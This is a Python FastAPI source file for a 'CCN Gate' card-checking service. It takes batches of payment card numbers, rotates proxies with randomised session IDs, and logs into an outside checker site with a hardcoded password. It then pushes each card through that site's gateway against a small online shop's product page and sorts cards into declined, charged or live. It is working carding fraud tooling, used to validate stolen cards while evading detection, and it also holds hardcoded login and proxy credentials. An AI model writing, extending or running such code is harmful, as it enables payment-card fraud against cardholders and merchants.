import os
import uuid
import string
import random
import asyncio
from typing import List, Optional

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
from fake_useragent import UserAgent

# ---------------------------
# FastAPI App
# ---------------------------
app = FastAPI(title="CCN Gate API", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------
# Models
# ---------------------------
class CCRequest(BaseModel):
    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

# ---------------------------
# Helpers
# ---------------------------
def load_proxies(path="proxies.txt"):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

users = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

async def get_session(proxy_line: str):
    """
    Creates a new AsyncClient with proxy configured.
    Returns: (session, proxy_url)
    """
    host, port, user, pwd = proxy_line.split(":")
    if "session-RANDOMID" in user:
        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"
    
    session = httpx.AsyncClient(
        proxies={"http://": proxy_url, "https://": proxy_url},
        timeout=httpx.Timeout(60.0),
        trust_env=False,
        follow_redirects=True
    )
    return session, proxy_url

# ---------------------------
# Core Payment Function (Updated with new site data)
# ---------------------------
async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(9999, 574545))
        mail = f"{user}@gmail.com"

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": users,
        }

        response = await session.get('https://ayanochk.vip/login.php', headers=headers)

        data = {
            'password': 'jesprada12reborn',
        }
        
        response = await session.post('https://ayanochk.vip/login.php', headers=headers, data=data)

        response = await session.get('https://ayanochk.vip/index.php', headers=headers)

        
        

        final = await session.get(
            f'https://ayanochk.vip/api/ppcpgatewayccn.php?lista={fullz}&proxy=178.128.69.159:31114:oc-045bd5bf215c66a611bed69974d9892d1715b3242d6ae48965c9989272c520c9:qrewlq6ifcv4&sites=https://tinyfragrances.co.uk/product/courreges-c/&xlite=undefined',
            headers=headers,
        )

        response_text = final.text

        if "DECLINED" in response_text:
            status, message = "declined", "Card Declined"
        elif "CCN CHARGED" in response_text:
            status, message = "charged", "CCN $69 Charged"
        elif "LIVE CCN" in response_text:
            status, message = "live", "Invalid CVV → CCN"
        else:
            # show actual API text instead of generic "API ISSUE"
            status, message = "error", f"Unexpected API Response: {response_text[:400]}"

        return CCResponse(
            card=fullz,
            status=status,
            message=message,
            proxy_used=proxy_url,
        )

    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        print("⚠️ Exception occurred while processing:", fullz)
        print(error_details)
        return CCResponse(
            card=fullz,
            status="error",
            message=error_details[:400],  # limit to avoid huge outputs
            proxy_used=proxy_url,
        )

# ---------------------------
# API ENDPOINTS (Updated to use unique proxy per card)
# ---------------------------
@app.get("/")
async def root():
    return {"message": "CCN Gate API is running"}

@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    card_list = cards.split(",")[:5]
    proxies = load_proxies()
    
    results = []
    for i, card in enumerate(card_list):
        if card.strip():
            # Use a different proxy for each card
            proxy_line = proxies[i % len(proxies)]
            session, proxy_url = await get_session(proxy_line)
            
            try:
                res = await create_payment_method(card.strip(), session, proxy_url)
                results.append(res)
            finally:
                await session.aclose()
                
            # Add small delay between cards
            await asyncio.sleep(random.uniform(1.5, 3.5))
    
    return results

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    card_list = request.cards.split(",")[:5]
    proxies = load_proxies()
    
    results = []
    for i, card in enumerate(card_list):
        if card.strip():
            # Use a different proxy for each card
            proxy_line = proxies[i % len(proxies)]
            session, proxy_url = await get_session(proxy_line)
            
            try:
                res = await create_payment_method(card.strip(), session, proxy_url)
                results.append(res)
            finally:
                await session.aclose()
                
            # Add small delay between cards
            await asyncio.sleep(random.uniform(1.5, 3.5))
    
    return results

# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
